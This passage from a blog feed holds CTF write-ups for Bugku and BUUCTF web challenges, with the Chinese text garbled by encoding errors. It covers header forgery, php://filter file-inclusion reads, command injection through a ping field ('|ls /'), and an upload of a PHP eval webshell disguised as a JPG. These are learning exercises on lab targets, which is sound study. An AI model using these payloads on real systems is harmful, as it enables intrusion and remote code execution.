    <content type="html"><![CDATA[<p>web25</p><h1 id="web26ï¼ˆä¼ªé€ Refererï¼‰"><a href="#web26ï¼ˆä¼ªé€ Refererï¼‰" class="headerlink" title="web26ï¼ˆä¼ªé€ Refererï¼‰"></a>web26ï¼ˆä¼ªé€ Refererï¼‰</h1><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\1.png" alt="1"></p><p>æˆ‘ä»¬çŸ¥é“Refererå¯ä»¥ä¼ªé€ çš„ï¼ŒburpæŠ“åŒ…ï¼Œæ·»åŠ è¯­å¥ï¼š<code>Referer: http://www.google.com</code></p><p>è·å¾—flag</p><p>web27</p><h1 id="web28ï¼šï¼ˆä¼ªé€ X-Forwarded-Forï¼‰"><a href="#web28ï¼šï¼ˆä¼ªé€ X-Forwarded-Forï¼‰" class="headerlink" title="web28ï¼šï¼ˆä¼ªé€ X-Forwarded-Forï¼‰"></a>web28ï¼šï¼ˆä¼ªé€ X-Forwarded-Forï¼‰</h1><p>è¿™é¢˜å°±æ˜¯ä¼ªé€ X-Forwarded-Forä¸å¤šè¯´äº†</p><p>web29</p><h1 id="web30ï¼šï¼ˆçŒœæµ‹-php-inputåˆ©ç”¨-file-get-contents-å‡½æ•°ç»•è¿‡ï¼‰"><a href="#web30ï¼šï¼ˆçŒœæµ‹-php-inputåˆ©ç”¨-file-get-contents-å‡½æ•°ç»•è¿‡ï¼‰" class="headerlink" title="web30ï¼šï¼ˆçŒœæµ‹ || php:inputåˆ©ç”¨||file_get_contents() å‡½æ•°ç»•è¿‡ï¼‰"></a>web30ï¼šï¼ˆçŒœæµ‹ || php:inputåˆ©ç”¨||file_get_contents() å‡½æ•°ç»•è¿‡ï¼‰</h1><p>é¢˜ç›®è¯´txtï¼Œä»€ä¹ˆç”¨å‘¢å…ˆè®°ç€</p><p>æ‰“å¼€é¢˜ç›®åœ°å€ï¼Œçœ‹è§æºç <img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\2.png" alt="2"></p><ul><li><p>æ–°å‡½æ•°ï¼š</p><p><strong>extract() å‡½æ•°</strong></p><p>åŠŸèƒ½ï¼š ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨</p><p>è¯­æ³•ï¼šextract(array,extract_rules,prefix)</p></li></ul><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td><em>array</em></td><td>å¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„æ•°ç»„ã€‚</td></tr><tr><td><em>extract_rules</em></td><td>å¯é€‰ã€‚extract() å‡½æ•°å°†æ£€æŸ¥æ¯ä¸ªé”®åæ˜¯å¦ä¸ºåˆæ³•çš„å˜é‡åï¼ŒåŒæ—¶ä¹Ÿæ£€æŸ¥å’Œç¬¦å·è¡¨ä¸­å·²å­˜åœ¨çš„å˜é‡åæ˜¯å¦å†²çªã€‚å¯¹ä¸åˆæ³•å’Œå†²çªçš„é”®åçš„å¤„ç†å°†æ ¹æ®æ­¤å‚æ•°å†³å®šã€‚ å¯èƒ½çš„å€¼ï¼š  EXTR_OVERWRITE - é»˜è®¤ã€‚å¦‚æœæœ‰å†²çªï¼Œåˆ™è¦†ç›–å·²æœ‰çš„å˜é‡ã€‚ EXTR_SKIP - å¦‚æœæœ‰å†²çªï¼Œä¸è¦†ç›–å·²æœ‰çš„å˜é‡ã€‚ EXTR_PREFIX_SAME - å¦‚æœæœ‰å†²çªï¼Œåœ¨å˜é‡åå‰åŠ ä¸Šå‰ç¼€ <em>prefix</em>ã€‚ EXTR_PREFIX_ALL - ç»™æ‰€æœ‰å˜é‡ååŠ ä¸Šå‰ç¼€ <em>prefix</em>ã€‚ EXTR_PREFIX_INVALID - ä»…åœ¨ä¸åˆæ³•æˆ–æ•°å­—å˜é‡åå‰åŠ ä¸Šå‰ç¼€ <em>prefix</em>ã€‚ EXTR_IF_EXISTS - ä»…åœ¨å½“å‰ç¬¦å·è¡¨ä¸­å·²æœ‰åŒåå˜é‡æ—¶ï¼Œè¦†ç›–å®ƒä»¬çš„å€¼ã€‚å…¶å®ƒçš„éƒ½ä¸å¤„ç†ã€‚ EXTR_PREFIX_IF_EXISTS - ä»…åœ¨å½“å‰ç¬¦å·è¡¨ä¸­å·²æœ‰åŒåå˜é‡æ—¶ï¼Œå»ºç«‹é™„åŠ äº†å‰ç¼€çš„å˜é‡åï¼Œå…¶å®ƒçš„éƒ½ä¸å¤„ç†ã€‚ EXTR_REFS - å°†å˜é‡ä½œä¸ºå¼•ç”¨æå–ã€‚å¯¼å…¥çš„å˜é‡ä»ç„¶å¼•ç”¨äº†æ•°ç»„å‚æ•°çš„å€¼ã€‚</td></tr><tr><td><em>prefix</em></td><td>å¯é€‰ã€‚è¯·æ³¨æ„ <em>prefix</em> ä»…åœ¨ <em>extract_type</em> çš„å€¼æ˜¯ EXTR_PREFIX_SAMEï¼ŒEXTR_PREFIX_ALLï¼ŒEXTR_PREFIX_INVALID æˆ– EXTR_PREFIX_IF_EXISTS æ—¶éœ€è¦ã€‚å¦‚æœé™„åŠ äº†å‰ç¼€åçš„ç»“æœä¸æ˜¯åˆæ³•çš„å˜é‡åï¼Œå°†ä¸ä¼šå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­ã€‚ å‰ç¼€å’Œæ•°ç»„é”®åä¹‹é—´ä¼šè‡ªåŠ¨åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿ã€‚</td></tr></tbody></table><p>  <strong>file_get_contents() å‡½æ•°</strong></p><p>  åŠŸèƒ½ï¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­</p><p>  è¯­æ³•ï¼šfile_get_contents(path,include_path,context,start,max_length)</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>path</td><td>å¿…éœ€ã€‚è§„å®šè¦è¯»å–çš„æ–‡ä»¶ã€‚</td></tr><tr><td>include_path</td><td>å¯é€‰ã€‚å¦‚æœæ‚¨è¿˜æƒ³åœ¨ include_pathï¼ˆåœ¨ php.ini ä¸­ï¼‰ä¸­æœç´¢æ–‡ä»¶çš„è¯ï¼Œè¯·è®¾ç½®è¯¥å‚æ•°ä¸º â€˜1â€™ã€‚</td></tr><tr><td>context</td><td>å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚context æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚è‹¥ä½¿ç”¨ NULLï¼Œåˆ™å¿½ç•¥ã€‚</td></tr><tr><td>start</td><td>å¯é€‰ã€‚è§„å®šåœ¨æ–‡ä»¶ä¸­å¼€å§‹è¯»å–çš„ä½ç½®ã€‚è¯¥å‚æ•°æ˜¯ PHP 5.1 ä¸­æ–°å¢çš„ã€‚</td></tr><tr><td>max_length</td><td>å¯é€‰ã€‚è§„å®šè¯»å–çš„å­—èŠ‚æ•°ã€‚è¯¥å‚æ•°æ˜¯ PHP 5.1 ä¸­æ–°å¢çš„ã€‚</td></tr></tbody></table><p>ä»£ç å®¡è®¡ï¼šé€šè¿‡getçš„æ–¹å¼è·å–$acå’Œ$fnï¼Œfile_get_contents() å‡½æ•°è¯»å–æ–‡ä»¶å†…å®¹ï¼Œç„¶åèµ‹å€¼ç»™$fï¼Œå½“$f=$acæ—¶è¾“å‡ºflag</p><p><strong>æ³•1ï¼š</strong>ç”±äºé¢˜ç›®æåˆ°ä¸€ä¸ªåç¼€txtï¼ŒçŒœæµ‹å­˜åœ¨æ–‡ä»¶åflag.txtï¼Œè®¿é—®ï¼Œæœç„¶å­˜åœ¨<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\3.png" alt="3"></p><p>æ„é€ payloadï¼š<code>?ac=bugku&amp;fn=flag.txt</code></p><p><strong>æ³•2ï¼š</strong>åˆ©ç”¨phpä¼ªåè®®php://input </p><p>å½“ä¼ å…¥çš„å‚æ•°å€¼ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°å€¼è®¾ä¸ºphp://input,åŒæ—¶<code>post</code>æƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œ<strong>phpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚</strong></p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\4.png" alt="4"></p><h1 id="web31ï¼šï¼ˆå¾¡å‰‘æ‰«æ-burpæš´åŠ›ç ´è§£ï¼‰"><a href="#web31ï¼šï¼ˆå¾¡å‰‘æ‰«æ-burpæš´åŠ›ç ´è§£ï¼‰" class="headerlink" title="web31ï¼šï¼ˆå¾¡å‰‘æ‰«æ+burpæš´åŠ›ç ´è§£ï¼‰"></a>web31ï¼šï¼ˆå¾¡å‰‘æ‰«æ+burpæš´åŠ›ç ´è§£ï¼‰</h1><p>åˆšæ‰“å¼€é¢˜ç›®åœ°å€è¿˜ä»¥ä¸ºç½‘ç»œå´©äº†ï¼Œåˆ·äº†å‡ æ¬¡è¿˜æ˜¯ä¸€æ ·ï¼Œé‚£åº”è¯¥å°±æ˜¯é¢˜ç›®é¡µé¢äº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æºç ï¼Œæ²¡ä¸œè¥¿ï¼Œèšå‰‘æ‰«ä¸€ä¸‹<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\5.png" alt="5"></p><p>å‘ç°æœ‰ä¸€ä¸ªrobots.txtï¼Œç‚¹è¿›å»çœ‹ä¸€ä¸‹<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\6.png" alt="6"></p><p>æ‰“å¼€resusl.php<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\7.png" alt="7"></p><p>å‘ç°è¿™é‡Œé€šè¿‡GETæ–¹å¼è·å–å‚æ•°xï¼Œå½“xçš„å€¼ç­‰passwordæ—¶åº”è¯¥å°±ä¼šè·³å‡ºflagäº†ï¼Œå°è¯•çˆ†ç ´</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\8.png" alt="8"></p><h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><p>ç¥ä»™é¢˜ï¼Œæ²¡çœ‹æºç åšä¸ªé¬¼</p><h1 id="web34ï¼šï¼ˆupload-ä¸€å¥è¯æœ¨é©¬ï¼‰"><a href="#web34ï¼šï¼ˆupload-ä¸€å¥è¯æœ¨é©¬ï¼‰" class="headerlink" title="web34ï¼šï¼ˆupload+ä¸€å¥è¯æœ¨é©¬ï¼‰"></a>web34ï¼šï¼ˆupload+ä¸€å¥è¯æœ¨é©¬ï¼‰</h1><p>æ‰“å¼€é¢˜ç›®åœ°å€ï¼Œé¡µé¢ä¸Šæ²¡ä»€ä¹ˆä¸œè¥¿ï¼ŒæŸ¥çœ‹æºç ï¼š<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\9.png" alt="9"></p><p>ç‚¹å¼€upload.php<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\10.png" alt="10"></p><p>å°è¯•ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åå‘ç°å®ƒè®¾ç«‹äº†ä¸€ä¸ªç™½åå•ï¼Œçœ‹èµ·æ¥ä¸å¥½ç»•äº†</p><p>ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œè®¿é—®ä¸Šä¼ åœ°å€ï¼š<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\11.png" alt="11"></p><p>æˆ‘ä»¬çœ‹åˆ°çœ‹æ¥æœåŠ¡å™¨è¿‡æ»¤äº†<code>&lt;?php</code>å’Œ<code>?&gt;</code></p><p><strong>æ³•1ï¼š</strong>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œåç¼€jpgï¼Œå†…å®¹<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]); &lt;/script&gt;</code>ä¸Šä¼ ï¼Œè®¿é—®å‘ç°ä¸€ç‰‡ç©ºç™½ï¼Œè¯´æ˜è¢«å½“åšphpä»£ç æ‰§è¡Œäº†ï¼Œèšå‰‘è¿æ¥ï¼Œç»ˆç«¯å¯»æ‰¾<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\12.png" alt="12"></p><p><strong>æ³•2ï¼š</strong>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œåç¼€jpgï¼Œå†…å®¹<code>&lt;script language=&quot;php&quot;&gt;system(&quot;find / -name flag*&quot;); &lt;/script&gt;</code></p><p>è®¿é—®ä¸Šä¼ åœ°å€<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\13.png" alt="13"></p><p>ç›´æ¥<code>?flie=/flag</code>   ï¼Œ flagå°±å‡ºæ¥äº†</p><p>ç„¶åæˆ‘è‡ªå·±ä¿®æ”¹äº†ä¸€ä¸‹æ–‡ä»¶å†…å®¹ï¼š<code>&lt;script language=&quot;php&quot;&gt;system(&quot;cat /flag&quot;); &lt;/script&gt;</code></p><p>è®¿é—®ä¸Šä¼ åœ°å€<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\14.png" alt="14"></p><h1 id="web35ï¼šï¼ˆååºåˆ—åŒ–ï¼‰"><a href="#web35ï¼šï¼ˆååºåˆ—åŒ–ï¼‰" class="headerlink" title="web35ï¼šï¼ˆååºåˆ—åŒ–ï¼‰"></a>web35ï¼šï¼ˆååºåˆ—åŒ–ï¼‰</h1><p>ç‚¹å¼€é¢˜ç›®åœ°å€</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\15.png" alt="15"></p><p>ç¬¬ä¸€çœ¼çœ‹è¿˜ä»¥ä¸ºæ˜¯ä¸€é“sqlæ³¨å…¥é¢˜ï¼Œç»“æœå‘ç°loginç‚¹ä¸åŠ¨ã€‚æŸ¥çœ‹æºç <img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\16.png" alt="16"></p><p>ç‚¹å‡»</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\17.png" alt="17"></p><p>å°è¯•ä¼ è¾“ï¼š<code>?25603</code><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\18.png" alt="18"></p><p>æˆ‘ä»¬çœ‹åˆ°å½“cookieçš„å€¼ååºåˆ—åŒ–åç­‰äºkeyçš„å€¼æ—¶ä¼šè¾“å‡ºflagï¼Œäºæ˜¯æˆ‘ä»¬è‡ªç„¶æƒ³åˆ°å°†keyçš„å€¼å…ˆåºåˆ—åŒ–åèµ‹å€¼ç»™cookie</p><p>phpåœ¨çº¿å·¥å…·ï¼š<code>https://c.runoob.com/compile/1</code><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\19.png" alt="19"></p><p>æ„é€ payload:<code>Cookie: BUGKU=s:13:&quot;ctf.bugku.com&quot;</code></p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku2\20.png" alt="20"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;web25&lt;/p&gt;
&lt;h1 id=&quot;web26ï¼ˆä¼ªé€ Refererï¼‰&quot;&gt;&lt;a href=&quot;#web26ï¼ˆä¼ªé€ Refererï¼‰&quot; class=&quot;headerlink&quot; title=&quot;web26ï¼ˆä¼ªé€ Refererï¼‰&quot;&gt;&lt;/a&gt;web26ï¼ˆä¼ªé€ Refererï¼‰&lt;/h1&gt;&lt;p&gt;&lt;</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>buuctf</title>
    <link href="http://example.com/2021/04/05/buuctf1/"/>
    <id>http://example.com/2021/04/05/buuctf1/</id>
    <published>2021-04-05T12:29:14.000Z</published>
    <updated>2021-04-15T10:06:41.628Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h1><p>ç‚¹å¼€å®¹å™¨ï¼Œå‘ç°<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\1.png" alt="1"></p><p>ç‚¹å‡»<code>tips</code><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\2.png" alt="2"></p><p>å‘ç°æ˜¯ç”¨æ–‡ä»¶åŒ…å«çš„æ–¹å¼æ‰“å¼€flag.phpæ–‡ä»¶</p><p>ä¹‹å‰åˆ·é¢˜æœ‰åšè¿‡ç”¨php://filterè¯»å–æ–‡ä»¶æºç ï¼Œè¿™é¢˜è¯•ä¸€ä¸‹</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\3.png" alt="3"></p><p>ç”¨base64-decode</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr($file,<span class="string">&quot;php://input&quot;</span>) || stristr($file,<span class="string">&quot;zip://&quot;</span>) || stristr($file,<span class="string">&quot;phar://&quot;</span>) || stristr($file,<span class="string">&quot;data:&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($file)&#123;</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.phpé‡Œæ²¡å†…å®¹ï¼Œçœ‹ä¸€ä¸‹flag.phpé‡Œçš„</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\4.png" alt="4"></p><p>ç”¨base64-decode</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Can you find out the flag?&quot;</span>;</span><br><span class="line"><span class="comment">//flag&#123;ce69e052-72a5-4f31-b4f7-d618aa394082&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h1><p>ç‚¹å¼€å®¹å™¨ï¼Œå‘ç°ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œç”¨å¾¡å‰‘è·‘äº†ä¸€ä¸‹ï¼Œå‘ç°å®¹æ˜“æœåŠ¡å™¨å´©ï¼Œçº¿ç¨‹å°‘åˆè·‘çš„æ…¢ï¼Œç‚¹å‡»æŸ¥çœ‹æºç <img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\5.png" alt="5"></p><p>ç‚¹å¼€ç®­å¤´æ‰€æŒ‡é“¾æ¥<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\6.png" alt="6"></p><p>ç‚¹å¼€ç®­å¤´æ‰€æŒ‡é“¾æ¥ï¼Œå‘ç°ä¼š302è·³è½¬åˆ°end.phpè¯´æ˜è¿™é‡Œé¢æœ‰çŒ«è…»</p><p>burpæŠ“åŒ…ï¼Œå‘é€åˆ°Repeater<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\7.png" alt="7"></p><p>è®¿é—®secr3t.phpï¼Œå¾—ä¸€æ®µä»£ç ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>secret<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag">    <span class="attr">highlight_file</span>(<span class="attr">__FILE__</span>);</span></span><br><span class="line"><span class="tag">    <span class="attr">error_reporting</span>(<span class="attr">0</span>);</span></span><br><span class="line"><span class="tag">    $<span class="attr">file</span>=<span class="string">$_GET[</span>&#x27;<span class="attr">file</span>&#x27;];</span></span><br><span class="line"><span class="tag">    <span class="attr">if</span>(<span class="attr">strstr</span>($<span class="attr">file</span>,&quot;<span class="attr">..</span>/&quot;)||<span class="attr">stristr</span>($<span class="attr">file</span>, &quot;<span class="attr">tp</span>&quot;)||<span class="attr">stristr</span>($<span class="attr">file</span>,&quot;<span class="attr">input</span>&quot;)||<span class="attr">stristr</span>($<span class="attr">file</span>,&quot;<span class="attr">data</span>&quot;))&#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">echo</span> &quot;<span class="attr">Oh</span> <span class="attr">no</span>!&quot;;</span></span><br><span class="line"><span class="tag">        <span class="attr">exit</span>();</span></span><br><span class="line"><span class="tag">    &#125;</span></span><br><span class="line"><span class="tag">    <span class="attr">include</span>($<span class="attr">file</span>); </span></span><br><span class="line"><span class="tag">//<span class="attr">flag</span>æ”¾åœ¨äº†<span class="attr">flag.php</span>é‡Œ</span></span><br><span class="line"><span class="tag">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿›è¡Œä¸‹ä¸€æ­¥çš„æ—¶å€™æˆ‘æ”¾äº†ä¸€ä¸ªé”™è¯¯ï¼Œæˆ‘çŸ¥é“è¦ç”¨php://filterè¯»å–flagæ–‡ä»¶ï¼Œä½†æ˜¯é”™è¯¯çš„åœ¨index.phpåä¼ å‚çš„ï¼Œ</p><p>ä¹Ÿå°±æ˜¯ï¼š<code>http://c76e7818-4c78-4212-841b-f65037874e73.node3.buuoj.cn/?file=php://filter/convert.base64-encode/resource=flag.php </code>è¿™æ ·æ˜¯é”™è¯¯çš„ï¼Œå› ä¸ºindex.phpæ²¡æœ‰æ–‡ä»¶åŒ…å«ï¼Œ</p><p>å› æ­¤æˆ‘ä»¬è¦æ”¹æˆï¼š<code>http://c76e7818-4c78-4212-841b-f65037874e73.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php </code></p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\8.png" alt="8"></p><p>å¯¹ç®­å·æ‰€æŒ‡çš„å­—ç¬¦ä¸²base64è§£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;Ã¥Â•ÂŠÃ¥Â“ÂˆÃ¯Â¼ÂÃ¤Â½ Ã¦Â‰Â¾Ã¥ÂˆÂ°Ã¦ÂˆÂ‘Ã¤ÂºÂ†Ã¯Â¼ÂÃ¥ÂÂ¯Ã¦Â˜Â¯Ã¤Â½ Ã§ÂœÂ‹Ã¤Â¸ÂÃ¥ÂˆÂ°Ã¦ÂˆÂ‘QAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">            echo &quot;Ã¦ÂˆÂ‘Ã¥Â°Â±Ã¥ÂœÂ¨Ã¨Â¿Â™Ã©Â‡ÂŒ&quot;;</span><br><span class="line">            $flag &#x3D; &#39;flag&#123;c2a2c0e2-6076-4c2a-a387-f45b291c0978&#125;&#39;;</span><br><span class="line">            $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>å¾—flag</p><h1 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h1><p>ç‚¹å¼€å®¹å™¨ï¼Œå‘ç°ä¸€ä¸ªpingçª—å£</p><p>pingä¸€ä¸‹å®¹å™¨åœ°å€<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\9.png" alt="9"></p><p>å›é¡¾ä¸€ä¸‹ç³»ç»Ÿå‘½ä»¤çš„<code>ç®¡é“ç¬¦</code></p><p>1ã€<code>|</code>ï¼ˆå°±æ˜¯æŒ‰ä½æˆ–ï¼‰ï¼Œç›´æ¥æ‰§è¡Œ|åé¢çš„è¯­å¥ </p><p>2ã€<code>||</code>ï¼ˆå°±æ˜¯é€»è¾‘æˆ–ï¼‰ï¼Œå¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥ </p><p>3ã€<code>&amp;</code>ï¼ˆå°±æ˜¯æŒ‰ä½ä¸ï¼‰ï¼Œ&amp;å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡ 4ã€<code>&amp;&amp;</code>ï¼ˆå°±æ˜¯é€»è¾‘ä¸ï¼‰ï¼Œå¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤ </p><p>5ã€<code>; </code>å‰åéƒ½æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡ï¼ŒåŒ&amp;ï¼Œï¼ˆlinuxä¹Ÿæœ‰ï¼‰</p><p>ping: <code>f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn |ls</code>â€”â€”æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\9.png" alt="9"></p><p>çœ‹æ¥flagä¸åœ¨å½“å‰ç›®å½•ä¸‹</p><p>ping: <code>f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn |ls /</code>â€”â€”æŸ¥çœ‹æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</p><p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\10.png" alt="10"></p><p>æˆ‘ä»¬çœ‹åˆ°åœ¨æ 